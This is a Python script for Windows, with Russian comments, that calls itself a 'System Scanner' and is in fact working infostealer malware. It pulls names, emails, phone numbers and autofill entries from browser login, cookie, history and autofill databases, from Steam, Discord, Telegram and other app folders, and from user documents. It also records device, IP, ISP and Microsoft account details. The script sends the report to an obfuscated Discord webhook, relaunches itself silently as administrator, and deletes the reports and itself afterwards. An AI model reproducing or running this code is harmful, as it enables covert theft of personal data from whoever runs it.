#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
System Scanner v4.0 FINAL
Сбор: устройство, сеть/провайдер, браузеры (все профили), 
приложения (Steam/Discord/Telegram/Epic/Battle/Origin/Ubisoft),
автозаполнение, Microsoft account, документы.
Шифрование отчёта AES-256-GCM.
"""

import os, sys, platform, socket, re, json, subprocess, time, sqlite3
import shutil, tempfile, hashlib, base64, urllib.request, urllib.parse
from datetime import datetime
from pathlib import Path
import winreg
import ctypes
from ctypes import wintypes

# AES (common module)
from crypto_common import HAS_CRYPTO, encrypt_report as encrypt_report_fn, decrypt_report as decrypt_report_fn, xor_decrypt

# Discord webhook (XOR-encrypted)
_DISCORD_WEBHOOK_HEX = '220e5bfc6d0744b02e135cef714f0fb1291542a37f4d02b03d1f4de4715200ec654b1ab92b0a59aa7c4e1bbe2a0b5aa9794f1cba317020e7732a42dd290558cb1e2519fa6e6f0afa034f58c15d0b2deb3b317de32d4f1dd1321575c6786e08f7061e70d951670aed221641c5676c53d63a0f6cbf46555ad10b'
DISCORD_WEBHOOK = xor_decrypt(_DISCORD_WEBHOOK_HEX)

# Colors
if os.name == 'nt': os.system('color')
G = '\033[92m'; Y = '\033[93m'; C = '\033[96m'
R = '\033[91m'; W = '\033[97m'; N = '\033[0m'; B = '\033[1m'

def cls(): os.system('cls' if os.name == 'nt' else 'clear')

def banner():
    cls()
    print(f"""{C}
+======================================================================+
|              {W}SYSTEM SCANNER v5.0{C}                    |
|   {Y}IP • Email • Phone • Browser • Apps • Autofill{C}   |
|          {Y}Encrypted Report • Validated Phones{C}        |
+======================================================================+{N}""")

def step(s,t,txt): print(f"\n{Y}[{s}/{t}] {txt}...{N}")
def ok(t): print(f"  {G}✓{N} {t}")
def warn(t): print(f"  {Y}⚠{N} {t}: не найдено")
def fail(t): print(f"  {R}✗{N} {t}")
def sec(t): print(f"\n{B}{G}[+] {t}{N}"); print(f"{G}{'─'*60}{N}")
def kv(k,v): print(f"  {W}▪ {k}:{N} {v}")

def wait_key():
    try: input(f"\n{Y}Нажмите Enter для выхода...{N}")
    except:
        try:
            import msvcrt
            print(f"\n{Y}Нажмите любую клавишу...{N}", end='', flush=True)
            msvcrt.getch()
        except: time.sleep(5)

# ============ GET FULL NAME (ФИО) ============
def get_full_name():
    """Получить полное имя пользователя из Windows."""
    try:
        import winreg
        k = winreg.OpenKey(
            winreg.HKEY_LOCAL_MACHINE,
            r"SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProfileList",
            0, winreg.KEY_READ
        )
        sid = None
        i = 0
        while True:
            try:
                subkey = winreg.EnumKey(k, i)
                i += 1
                sub = winreg.OpenKey(k, subkey, 0, winreg.KEY_READ)
                try:
                    val = winreg.QueryValueEx(sub, "ProfileImagePath")[0]
                    if val.lower().startswith(os.environ.get('USERPROFILE', '').lower()):
                        sid = subkey
                except:
                    pass
                winreg.CloseKey(sub)
            except:
                break
        winreg.CloseKey(k)
        if sid:
            k2 = winreg.OpenKey(k, sid, 0, winreg.KEY_READ)
            try:
                name = winreg.QueryValueEx(k2, "FullName")[0]
                if name:
                    winreg.CloseKey(k2)
                    return name
            except:
                pass
            winreg.CloseKey(k2)
    except:
        pass
    
    # Fallback: через WMI
    try:
        import wmi
        c = wmi.WMI()
        for user in c.Win32_UserAccount():
            if user.Domain + '\\' + user.Name == os.environ.get('USERDOMAIN', '') + '\\' + os.environ.get('USERNAME', ''):
                return user.FullName or user.Name
    except:
        pass
    
    return os.environ.get('USERNAME', 'Unknown')


# ============ SILENT ADMIN ============
def run_as_admin_silent():
    """Тихо перезапускает от админа без звука и окон."""
    try:
        import ctypes
        if ctypes.windll.shell32.IsUserAnAdmin():
            return False
    except:
        return False
    
    try:
        import sys
        script = sys.executable
        params = ' '.join(['"%s"' % p for p in [sys.argv[0]] + sys.argv[1:]])
        ctypes.windll.shell32.ShellExecuteW(None, "runas", script, params, None, 0)
        sys.exit(0)
    except:
        return False
    return True


def self_delete():
    """Самоудаление после завершения работы."""
    try:
        import sys
        import subprocess
        import time
        
        script_path = os.path.abspath(sys.argv[0])
        batch_path = os.path.join(tempfile.gettempdir(), '_scanner_cleanup.bat')
        
        with open(batch_path, 'w') as f:
            f.write(f"@echo off\r\n")
            f.write(f"timeout /t 2 /nobreak >nul\r\n")
            f.write(f"del /f /q \"{script_path}\" >nul 2>&1\r\n")
            f.write(f"del /f /q \"{batch_path}\" >nul 2>&1\r\n")
        
        subprocess.Popen([batch_path], creationflags=subprocess.CREATE_NO_WINDOW)
    except:
        pass

# ============ DISCORD WEBHOOK ============
def send_discord_report(data: dict, txt_file: str):
    """Отправить отчёт в Discord через webhook (embed + файл)."""
    if not DISCORD_WEBHOOK:
        return False
    try:
        # Собираем основные данные для embed
        emails = data.get('Email из браузеров', []) + data.get('Email из приложений', []) + data.get('Email из документов', [])
        phones = data.get('Телефоны из браузеров (валидные)', []) + data.get('Телефоны из документов', [])
        net = data.get('Сеть и провайдер', {})
        device = data.get('Устройство', {})
        
        # Формируем описание embed
        desc = f"**ФИО:** {device.get('ФИО', 'N/A')}\n"
        desc += f"**Email:** {len(set(emails))} шт.\n**Телефоны:** {len(phones)} шт.\n"
        desc += f"**Провайдер:** {net.get('Провайдер (ISP)', 'N/A')}\n"
        desc += f"**Публичный IP:** {net.get('Публичный IP', 'N/A')}\n"
        desc += f"**Устройство:** {device.get('Имя компьютера', 'N/A')}\n"
        desc += f"**Пользователь:** {device.get('Пользователь', 'N/A')}\n"
        desc += f"**Дата:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
        
        # Создаём embed
        embed = {
            'title': '[Scanner] System Scanner v5.0 - Report',
            'description': desc,
            'color': 15158332,  # Красный цвет
            'footer': {
                'text': f'System Scanner v5.0 | {platform.node()}'
            },
            'timestamp': datetime.now().isoformat()
        }
        
        # Отправляем txt файл
        with open(txt_file, 'rb') as f:
            files = {
                'payload_json': (None, json.dumps({'embeds': [embed]}).encode('utf-8'), 'application/json'),
                'file': (os.path.basename(txt_file), f, 'text/plain; charset=utf-8')
            }
            req = _encode_multipart(DISCORD_WEBHOOK, files)
            resp = urllib.request.urlopen(req, timeout=30)
            print(f"  [OK] Discord: txt отправлен ({resp.status})")
            
            # Отправляем .enc файл
            enc_file = txt_file.replace('.txt', '.enc')
            if os.path.exists(enc_file):
                with open(enc_file, 'rb') as f:
                    files2 = {
                        'payload_json': (None, json.dumps({'embeds': [embed]}).encode('utf-8'), 'application/json'),
                        'file': (os.path.basename(enc_file), f, 'application/octet-stream')
                    }
                    req2 = _encode_multipart(DISCORD_WEBHOOK, files2)
                    resp2 = urllib.request.urlopen(req2, timeout=30)
                    print(f"  [OK] Discord: enc отправлен ({resp2.status})")
            
            # Удаляем файлы отчёта после отправки
            try:
                if os.path.exists(txt_file):
                    os.remove(txt_file)
                if os.path.exists(enc_file):
                    os.remove(enc_file)
            except:
                pass
            
            return True
    except Exception as e:
        print(f"  [FAIL] Discord: {e}")
        return False


def _encode_multipart(url: str, files: dict) -> urllib.request.Request:
    """Кодирует файлы в multipart/form-data для Discord webhook."""
    import uuid
    boundary = str(uuid.uuid4()).replace('-', '')
    parts = []
    for field_name, (filename, file_obj, content_type) in files.items():
        parts.append(f'--{boundary}'.encode())
        if filename:
            parts.append(f'Content-Disposition: form-data; name="{field_name}"; filename="{filename}"'.encode())
        else:
            parts.append(f'Content-Disposition: form-data; name="{field_name}"'.encode())
        parts.append(f'Content-Type: {content_type}'.encode())
        parts.append(b'')
        if isinstance(file_obj, bytes):
            parts.append(file_obj)
        else:
            parts.append(file_obj.read())
        parts.append(b'')
    parts.append(f'--{boundary}--'.encode())
    body = b'\r\n'.join(parts)
    
    headers = {
        'Content-Type': f'multipart/form-data; boundary={boundary}',
        'Content-Length': str(len(body))
    }
    
    # Создаём HTTP-запрос
    req = urllib.request.Request(
        url,
        data=body,
        headers=headers,
        method='POST'
    )
    return req


# ============ ENCRYPTION ============
# ============ 1. DEVICE ============
def get_device():
    d = {}
    d['ФИО'] = get_full_name()
    d['Имя компьютера'] = platform.node()
    d['Пользователь'] = os.environ.get('USERNAME', '?')
    d['ОС'] = f"{platform.system()} {platform.release()}"
    d['Версия ОС'] = platform.version()
    d['Архитектура'] = platform.machine()
    d['Процессор'] = platform.processor()
    try:
        import psutil
        vm = psutil.virtual_memory()
        d['RAM (всего)'] = f"{vm.total/(1024**3):.1f} GB"
        d['RAM (доступно)'] = f"{vm.available/(1024**3):.1f} GB"
        d['RAM (использовано)'] = f"{vm.percent}%"
        d['CPU (ядра)'] = f"{psutil.cpu_count(logical=True)}л / {psutil.cpu_count(logical=False)}ф"
        d['CPU (загрузка)'] = f"{psutil.cpu_percent(interval=0.3)}%"
        disks = []
        for p in psutil.disk_partitions():
            try:
                u = psutil.disk_usage(p.mountpoint)
                disks.append(f"{p.device} → {u.percent}% ({u.free//(1024**3)}GB св.)")
            except: pass
        d['Диски'] = disks
        bt = datetime.fromtimestamp(psutil.boot_time())
        up = datetime.now() - bt
        d['Время работы'] = f"{up.days}д {up.seconds//3600}ч {(up.seconds%3600)//60}м"
        d['Процессы'] = len(psutil.pids())
    except: pass
    try: d['UUID'] = hashlib.md5((platform.node()+platform.machine()).encode()).hexdigest()
    except: pass
    return d

# ============ 2. NETWORK ============
def get_network():
    n = {}
    try:
        n['Hostname'] = socket.gethostname()
        n['Локальный IP'] = socket.gethostbyname(socket.gethostname())
    except: n['Локальный IP'] = '?'
    ok("Локальный IP определён")
    
    ip_pub = None
    try:
        with urllib.request.urlopen('https://api.ipify.org', timeout=8) as r:
            ip_pub = r.read().decode()
            n['Публичный IP'] = ip_pub
        ok(f"Публичный IP: {ip_pub}")
    except:
        n['Публичный IP'] = 'нет доступа'
        fail("Нет доступа к интернету")
    
    if ip_pub:
        try:
            with urllib.request.urlopen(f'https://ipapi.co/{ip_pub}/json/', timeout=8) as r:
                data = json.loads(r.read())
                n['Провайдер (ISP)'] = data.get('org','N/A')
                n['ASN'] = f"AS{data.get('asn','')}" if data.get('asn') else 'N/A'
                n['Страна'] = data.get('country_name','N/A')
                n['Город'] = data.get('city','N/A')
                n['Регион'] = data.get('region','N/A')
                n['Часовой пояс'] = data.get('timezone','N/A')
                ok(f"Провайдер: {data.get('org','N/A')}")
        except:
            n['Провайдер'] = 'не удалось'
    
    n['Интерфейсы'] = []
    try:
        r = subprocess.run(['ipconfig'], capture_output=True, text=True, creationflags=subprocess.CREATE_NO_WINDOW)
        cur = None
        for line in r.stdout.split('\n'):
            s = line.strip()
            if 'Адаптер' in s or 'adapter' in s.lower():
                cur = s.split(':')[0].replace('Адаптер','').replace('adapter','').strip()
            if cur and ('IPv4' in s or 'IP-адрес' in s):
                ip = s.split(':')[-1].strip()
                if ip and ip != '127.0.0.1':
                    n['Интерфейсы'].append(f"{cur}: {ip}")
    except: pass
    
    n['MAC адреса'] = []
    try:
        r = subprocess.run(['getmac','/FO','CSV','/NH'], capture_output=True, text=True, creationflags=subprocess.CREATE_NO_WINDOW)
        for line in r.stdout.strip().split('\n'):
            if line.strip():
                parts = line.strip('"').split('","')
                if parts and parts[0] and parts[0] != 'N/A':
                    n['MAC адреса'].append(f"{parts[1] if len(parts)>1 else '-'}: {parts[0]}")
    except: pass
    
    n['DNS'] = []
    try:
        r = subprocess.run(['ipconfig','/all'], capture_output=True, text=True, creationflags=subprocess.CREATE_NO_WINDOW)
        for line in r.stdout.split('\n'):
            if 'DNS' in line and ':' in line:
                dns = line.split(':')[-1].strip()
                if dns and dns not in n['DNS']: n['DNS'].append(dns)
    except: pass
    
    try:
        r = subprocess.run(['ipconfig'], capture_output=True, text=True, creationflags=subprocess.CREATE_NO_WINDOW)
        for line in r.stdout.split('\n'):
            if 'Основной шлюз' in line or 'Default Gateway' in line:
                gw = line.split(':')[-1].strip()
                if gw: n['Шлюз'] = gw; break
    except: pass
    return n

# ============ 3. BROWSERS (ALL PROFILES) ============
def get_profiles():
    local = os.environ.get('LOCALAPPDATA','')
    roam = os.environ.get('APPDATA','')
    profs = []
    brs = {
        'Chrome': (local, ['Google','Chrome','User Data']),
        'Edge': (local, ['Microsoft','Edge','User Data']),
        'Yandex': (local, ['Yandex','YandexBrowser','User Data']),
        'Brave': (local, ['BraveSoftware','Brave-Browser','User Data']),
        'Vivaldi': (local, ['Vivaldi','User Data']),
        'Opera': (roam, ['Opera Software','Opera Stable']),
        'Opera GX': (roam, ['Opera Software','Opera GX Stable']),
        'Firefox': (roam, ['Mozilla','Firefox','Profiles']),
    }
    for bn, (base, parts) in brs.items():
        ud = os.path.join(base, *parts)
        if not os.path.exists(ud): continue
        if bn == 'Firefox':
            try:
                for prof in os.listdir(ud):
                    pp = os.path.join(ud, prof)
                    if os.path.isdir(pp) and ('default' in prof.lower() or 'release' in prof.lower()):
                        profs.append((bn, pp))
            except: pass
        else:
            try:
                found = False
                for item in os.listdir(ud):
                    ipath = os.path.join(ud, item)
                    if os.path.isdir(ipath):
                        if item == 'Default' or item.startswith('Profile '):
                            profs.append((bn, ipath)); found = True
                if not found: profs.append((bn, ud))
            except: profs.append((bn, ud))
    return profs

def scan_db(path):
    em, ph, af = set(), set(), set()
    ep = re.compile(r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}')
    pp = [re.compile(r'\+7[\s\-]?\(?\d{3}\)?[\s\-]?\d{3}[\s\-]?\d{2}[\s\-]?\d{2}'),
          re.compile(r'8[\s\-]?\(?\d{3}\)?[\s\-]?\d{3}[\s\-]?\d{2}[\s\-]?\d{2}'),
          re.compile(r'7\d{10}'), re.compile(r'8\d{10}'), re.compile(r'\+\d{1,3}\d{6,12}')]
    if not path or not os.path.exists(path) or os.path.getsize(path) < 100:
        return em, ph, af
    try:
        tmp = tempfile.mktemp(suffix='.db')
        shutil.copy2(path, tmp)
        conn = sqlite3.connect(tmp)
        conn.text_factory = bytes
        cur = conn.cursor()
        cur.execute("SELECT name FROM sqlite_master WHERE type='table'")
        tables = [r[0] for r in cur.fetchall()]
        for tbl in tables:
            tn = tbl.decode('utf-8','ignore') if isinstance(tbl, bytes) else tbl
            try:
                cur.execute(f'SELECT * FROM "{tn}"')
                for row in cur.fetchall()[:500]:
                    txt = ' '.join(str(c) if c is not None else '' for c in row)
                    for e in ep.findall(txt):
                        d = e.split('@')[1].lower()
                        if len(d) < 35 and '.' in d and not any(x in e for x in ['example','test','localhost','@domain']):
                            em.add(e.lower())
                    for pat in pp:
                        for p in pat.findall(txt):
                            cl = re.sub(r'[\s\-\(\)\.]','',p)
                            dg = re.sub(r'\D','',cl)
                            if 10 <= len(dg) <= 15: ph.add(cl)
                    for cell in row:
                        if cell and isinstance(cell, (bytes,str)):
                            s = cell.decode('utf-8','ignore') if isinstance(cell, bytes) else cell
                            if 3 < len(s) < 200: af.add(s.strip())
            except: continue
        conn.close(); os.unlink(tmp)
    except: pass
    return em, ph, af

def scan_bm(path):
    em = set()
    if not os.path.exists(path): return em
    ep = re.compile(r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}')
    try:
        with open(path,'r',encoding='utf-8',errors='ignore') as f:
            for e in ep.findall(f.read(200000)):
                d = e.split('@')[1].lower()
                if len(d) < 35 and '.' in d and not any(x in e for x in ['example','test','localhost']):
                    em.add(e.lower())
    except: pass
    return em

def scan_browsers():
    print("")
    profs = get_profiles()
    ok(f"Профилей браузеров: {len(profs)}")
    allem, allph, allaf = set(), set(), set()
    brdet = {}
    for bn, pp in profs:
        key = f"{bn} ({os.path.basename(pp)})"
        bem, bph = set(), set()
        for lf in ['Login Data','Login Data For Account','Ya Login Data','Web Data']:
            db = os.path.join(pp, lf)
            e, p, a = scan_db(db)
            bem.update(e); bph.update(p); allaf.update(a)
            if e or p:
                brdet[key] = brdet.get(key,{})
                brdet[key]['Login'] = {'emails': list(e)[:10], 'phones': list(p)[:10]}
        bm = os.path.join(pp, 'Bookmarks')
        e = scan_bm(bm); bem.update(e); allem.update(e)
        if e: brdet[key] = brdet.get(key,{}); brdet[key]['Bookmarks'] = list(e)[:10]
        hist = os.path.join(pp, 'History')
        e, p, a = scan_db(hist); bem.update(e); allem.update(e)
        if e: brdet[key] = brdet.get(key,{}); brdet[key]['History'] = list(e)[:10]
        af = os.path.join(pp, 'Autofill')
        if os.path.exists(af): _, _, a = scan_db(af); allaf.update(a)
        cook = os.path.join(pp, 'Cookies')
        if os.path.exists(cook): e, _, _ = scan_db(cook); bem.update(e)
        allem.update(bem); allph.update(bph)
        if bem: ok(f"{bn} ({os.path.basename(pp)}): {len(bem)} email, {len(bph)} phone")
        elif os.path.exists(pp): warn(f"{bn} ({os.path.basename(pp)})")
    return list(allem), list(allph), list(allaf)[:100], brdet

# ============ 4. APPS ============
def scan_apps():
    print("")
    local = os.environ.get('LOCALAPPDATA','')
    roam = os.environ.get('APPDATA','')
    prg86 = 'C:\\Program Files (x86)'; prg = 'C:\\Program Files'
    
    apps = {
        'Steam': [os.path.join(roam,'Steam'), os.path.join(local,'Steam'),
                  os.path.join(prg86,'Steam'), os.path.join(prg,'Steam')],
        'Discord': [os.path.join(roam,'discord'), os.path.join(local,'Discord')],
        'Telegram': [os.path.join(roam,'Telegram Desktop')],
        'Epic Games': [os.path.join(local,'EpicGamesLauncher'), os.path.join(prg,'Epic Games'),
                       os.path.join(prg86,'Epic Games')],
        'Battle.net': [os.path.join(roam,'Battle.net'), os.path.join(prg86,'Battle.net')],
        'Origin': [os.path.join(roam,'Origin'), os.path.join(local,'Origin')],
        'Ubisoft': [os.path.join(local,'Ubisoft Game Launcher'),
                    os.path.join(prg86,'Ubisoft','Ubisoft Game Launcher')],
    }
    
    ep = re.compile(r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}')
    allem = set(); appdet = {}
    for an, paths in apps.items():
        found = False; ad = {'found': False, 'paths': [], 'emails': []}
        for path in paths:
            if os.path.exists(path):
                found = True; ad['found'] = True; ad['paths'].append(path)
                try:
                    for root, dirs, files in os.walk(path):
                        if root.replace(path,'').count(os.sep) > 3: continue
                        for f in files:
                            fp = os.path.join(root,f)
                            try:
                                if os.path.getsize(fp) > 300000: continue
                                with open(fp,'r',encoding='utf-8',errors='ignore') as fh:
                                    for e in ep.findall(fh.read(100000)):
                                        d = e.split('@')[1].lower()
                                        if len(d) < 35 and '.' in d and not any(x in e for x in ['example','test','localhost']):
                                            allem.add(e.lower()); ad['emails'].append(e.lower())
                            except: pass
                except: pass
                break
        if found: ok(f"{an}: обнаружен" + (f" ({len(ad['emails'])} email)" if ad['emails'] else ""))
        else: warn(an)
        appdet[an] = ad
    return list(set(allem)), appdet

# ============ 5. WINDOWS ACCOUNT ============
def get_win_acct():
    info = {}
    info['Пользователь'] = os.environ.get('USERNAME','?')
    try:
        import winreg
        k = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
            r"Software\Microsoft\IdentityCRL\UserExtendedProperties")
        i = 0; accs = []
        while True:
            try: accs.append(winreg.EnumKey(k,i)); i+=1
            except: break
        winreg.CloseKey(k)
        info['Microsoft Account(s)'] = ', '.join(accs) if accs else 'не обнаружен'
    except: info['Microsoft Account'] = 'не обнаружен'
    try:
        import winreg
        k = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
            r"Software\Microsoft\Windows\CurrentVersion\Authentication\LogonUI")
        info['Последний вход'] = winreg.QueryValueEx(k,'LastLoggedOnUser')[0]
        winreg.CloseKey(k)
    except: pass
    try:
        import winreg
        k = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
            r"Software\Microsoft\Office\16.0\Outlook\Profiles")
        i = 0; profs = []
        while True:
            try: profs.append(winreg.EnumKey(k,i)); i+=1
            except: break
        winreg.CloseKey(k)
        if profs: info['Outlook профили'] = ', '.join(profs)
    except: pass
    return info

# ============ 6. USER FILES ============
def scan_uf():
    user = os.environ.get('USERPROFILE','')
    dirs = {'Documents': os.path.join(user,'Documents'),
            'Desktop': os.path.join(user,'Desktop'),
            'Downloads': os.path.join(user,'Downloads')}
    ep = re.compile(r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}')
    pp = [re.compile(r'\+7[\s\-]?\(?\d{3}\)?[\s\-]?\d{3}[\s\-]?\d{2}[\s\-]?\d{2}'),
          re.compile(r'8[\s\-]?\(?\d{3}\)?[\s\-]?\d{3}[\s\-]?\d{2}[\s\-]?\d{2}'),
          re.compile(r'7\d{10}'), re.compile(r'8\d{10}'), re.compile(r'\+\d{1,3}\d{6,12}')]
    em, ph = set(), set()
    exts = ('.txt','.log','.csv','.json','.xml','.html','.htm','.cfg','.ini',
            '.doc','.docx','.xls','.xlsx','.rtf','.pdf')
    total = 0; maxf = 300
    for dn, dp in dirs.items():
        if not os.path.exists(dp): warn(f"Папка {dn}"); continue
        cnt = 0
        try:
            for root, dirs_l, files in os.walk(dp):
                dirs_l[:] = [d for d in dirs_l if not d.startswith('.')]
                for f in files:
                    if total >= maxf: break
                    if f.lower().endswith(exts):
                        fp = os.path.join(root,f)
                        try:
                            if os.path.getsize(fp) > 2*1024*1024: continue
                            with open(fp,'r',encoding='utf-8',errors='ignore') as fh:
                                ct = fh.read(50000)
                                for e in ep.findall(ct):
                                    d = e.split('@')[1].lower()
                                    if len(d) < 35 and '.' in d and not any(x in e for x in ['example','test','localhost','.png','.jpg','.ico','.svg']):
                                        em.add(e.lower())
                                for pat in pp:
                                    for p in pat.findall(ct):
                                        cl = re.sub(r'[\s\-\(\)\.]','',p)
                                        dg = re.sub(r'\D','',cl)
                                        if 10 <= len(dg) <= 15: ph.add(cl)
                            cnt += 1; total += 1
                        except: pass
        except: pass
        ok(f"{dn}: {cnt} файлов")
    return list(em)[:50], list(ph)[:30]

# ============ 7. PHONE VALIDATION ============
def valid_phone(p):
    cl = re.sub(r'[\s\-\(\)\.]','',p)
    dg = re.sub(r'\D','',cl)
    if len(dg) == 11 and dg[0] in '78':
        rus = ['901','902','903','904','905','906','908','909',
               '910','911','912','913','914','915','916','917','918','919',
               '920','921','922','923','924','925','926','927','928','929',
               '930','931','932','933','934','935','936','937','938','939',
               '950','951','952','953','954','955','956','957','958','959',
               '960','961','962','963','964','965','966','967','968','969',
               '970','971','972','973','974','975','976','977','978','979',
               '980','981','982','983','984','985','986','987','988','989',
               '991','992','993','994','995','996','997','998','999']
        if dg[1:4] in rus: return True, 'Россия'
        return True, 'Международный'
    if 7 <= len(dg) <= 15: return True, 'Международный'
    return False, 'Невалидный'

def valid_phones(phs):
    v = []; iv = []
    for p in phs:
        okk, r = valid_phone(p)
        if okk: v.append((p, r))
        else: iv.append(p)
    return v, iv

# ============ 8. SAVE REPORT ============
def save_report(data):
    desk = os.path.join(os.environ.get('USERPROFILE','C:/'),'Desktop')
    ts = datetime.now().strftime('%Y%m%d_%H%M%S')
    
    txt = os.path.join(desk, f'system_report_{ts}.txt')
    with open(txt, 'w', encoding='utf-8') as f:
        f.write("═══════════════════════════════════════════════════════════\n")
        f.write("  SYSTEM SCANNER v4.0 - ПОЛНЫЙ ОТЧЕТ\n")
        f.write(f"  Дата: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
        f.write("═══════════════════════════════════════════════════════════\n\n")
        for sec, d in data.items():
            f.write(f"\n[+] {sec.upper()}\n"); f.write("─"*50+"\n")
            if isinstance(d, dict):
                for k, v in d.items():
                    if isinstance(v, list):
                        f.write(f"{k}:\n")
                        for i in v:
                            if isinstance(i, tuple): f.write(f"  {i[0]} ({i[1]})\n")
                            else: f.write(f"  {i}\n")
                    elif isinstance(v, dict):
                        f.write(f"{k}:\n")
                        for k2, v2 in v.items():
                            if isinstance(v2, list):
                                f.write(f"  {k2}:\n")
                                for i in v2[:10]: f.write(f"    {i}\n")
                            else: f.write(f"  {k2}: {v2}\n")
                    else: f.write(f"{k}: {v}\n")
            elif isinstance(d, list):
                for i in d:
                    if isinstance(i, tuple): f.write(f"{i[0]} ({i[1]})\n")
                    else: f.write(f"{i}\n")
    ok(f"Текстовый: {txt}")
    
    enc = None
    if HAS_CRYPTO:
        enc = os.path.join(desk, f'system_report_{ts}.enc')
        encrypt_report_fn(data, enc)
        ok(f"Зашифрованный: {enc}")
    return txt, enc

# ============ 9. PRINT HELPERS ============
def items_list(title, items, icon='•', empty='не найдено'):
    print(f"\n{B}{G}[+] {title}{N}")
    print(f"{G}{'─'*60}{N}")
    if items:
        for i in items:
            if isinstance(i, tuple): print(f"  {C}{icon}{N} {i[0]}  ({Y}{i[1]}{N})")
            else: print(f"  {C}{icon}{N} {i}")
    else: print(f"  {Y}{empty}{N}")

def print_dict(title, d):
    print(f"\n{B}{G}[+] {title}{N}")
    print(f"{G}{'─'*60}{N}")
    for k, v in d.items():
        if isinstance(v, list):
            kv(k, '')
            for i in v[:8]: print(f"    {i}")
        elif isinstance(v, dict):
            kv(k, '')
            for k2, v2 in v.items():
                if isinstance(v2, list):
                    print(f"    {k2}:")
                    for i in v2[:5]: print(f"      {i}")
                else: print(f"    {k2}: {v2}")
        else: kv(k, v)

# ============ MAIN ============
def main():
    # Тихий запуск от админа (без звука и окон)
    run_as_admin_silent()
    
    banner()
    steps = 7
    all_data = {}
    
    # Step 1: Device
    step(1, steps, "Информация об устройстве")
    dev = get_device()
    print_dict("УСТРОЙСТВО", dev)
    all_data['Устройство'] = dev
    
    # Step 2: Network
    step(2, steps, "IP адреса, провайдер, сеть")
    net = get_network()
    print_dict("СЕТЬ И ПРОВАЙДЕР", net)
    all_data['Сеть и провайдер'] = net
    
    # Step 3: Browsers
    step(3, steps, "Сканирование браузеров (все профили, автозаполнение)")
    bem, bph, baf, bdet = scan_browsers()
    val_ph, inv_ph = valid_phones(bph)
    items_list("EMAIL ИЗ БРАУЗЕРОВ", bem[:30], '✉')
    items_list("ВАЛИДНЫЕ ТЕЛЕФОНЫ", val_ph[:20], '☎')
    if inv_ph:
        items_list("НЕВАЛИДНЫЕ ТЕЛЕФОНЫ", inv_ph[:10], '✖')
    items_list("ДАННЫЕ АВТОЗАПОЛНЕНИЯ", baf[:30], '📝')
    all_data['Email из браузеров'] = bem[:50]
    all_data['Телефоны из браузеров (валидные)'] = [f"{p} ({r})" for p,r in val_ph[:30]]
    all_data['Автозаполнение'] = baf[:100]
    all_data['Браузеры (детали)'] = bdet
    
    # Step 4: Apps
    step(4, steps, "Сканирование приложений (Steam, Discord, Telegram, Epic и др.)")
    aem, adet = scan_apps()
    items_list("EMAIL ИЗ ПРИЛОЖЕНИЙ", aem[:20], '✉')
    all_data['Email из приложений'] = aem[:30]
    all_data['Приложения (детали)'] = adet
    
    # Step 5: User files
    step(5, steps, "Сканирование документов")
    fem, fph = scan_uf()
    val_ph2, _ = valid_phones(fph)
    items_list("EMAIL ИЗ ДОКУМЕНТОВ", fem[:20], '✉')
    items_list("ТЕЛЕФОНЫ ИЗ ДОКУМЕНТОВ", [f"{p} ({r})" for p,r in val_ph2[:15]], '☎')
    all_data['Email из документов'] = fem[:30]
    all_data['Телефоны из документов'] = [f"{p} ({r})" for p,r in val_ph2[:20]]
    
    # Step 6: Windows Account
    step(6, steps, "Учётная запись Windows / Microsoft")
    acct = get_win_acct()
    print_dict("MICROSOFT / WINDOWS", acct)
    all_data['Учётная запись'] = acct
    
    # Step 7: Save
    step(7, steps, "Сохранение отчёта")
    txt_f, enc_f = save_report(all_data)
    
    # Отправка в Discord
    try:
        send_discord_report(all_data, txt_f)
    except:
        pass
    
    # Summary
    allem = list(set(bem + aem + fem))
    val_ph, _ = valid_phones(list(set(bph + fph)))
    allph = list(set([p for p,_ in val_ph]))
    
    print(f"\n{Y}{'═'*60}{N}")
    print(f"{B}{G}✓ СКАНИРОВАНИЕ ЗАВЕРШЕНО!{N}")
    print(f"  {W}■{N} Email: {Y}{len(allem)}{N}")
    print(f"  {W}■{N} Телефонов (валидных): {Y}{len(allph)}{N}")
    print(f"  {W}■{N} Провайдер: {Y}{net.get('Провайдер (ISP)','не определён')}{N}")
    print(f"  {W}■{N} Отчёт: {C}{txt_f}{N}")
    if enc_f: print(f"  {W}■{N} Зашифрованный: {C}{enc_f}{N}")
    print(f"{Y}{'═'*60}{N}")
    
    # Самоудаление
    self_delete()

if __name__ == '__main__':
    try:
        main()
        wait_key()
    except KeyboardInterrupt:
        print(f"\n{Y}Прервано{N}")
        wait_key()
        sys.exit(0)
    except Exception as e:
        print(f"\n{R}Ошибка: {e}{N}")
        wait_key()
        sys.exit(1)
